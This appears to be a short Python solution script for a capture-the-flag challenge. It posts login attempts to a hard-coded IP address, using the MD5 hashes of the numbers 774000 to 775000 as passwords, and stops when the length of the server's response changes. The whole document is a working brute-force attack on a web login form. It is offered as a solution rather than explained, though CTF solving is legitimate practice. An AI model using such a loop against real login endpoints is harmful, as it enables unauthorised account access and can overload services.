url = "http://121.5.62.30:38001/EasyTime/Syclover"

import requests

data = {
    "username" : "Syclover",
    "password" : "123"
}
resp = requests.post(url, data = data)
print(resp.text)


import hashlib

for i in range(774000, 775000):
    hash = hashlib.md5()
    hash.update(str(i).encode("utf-8"))
    data["password"] = hash.hexdigest()
    new_resp = requests.post(url, data = data)
    if(len(new_resp.text) != len(resp.text)):
        print(new_resp.text)
        print("here!!! ", i)
        break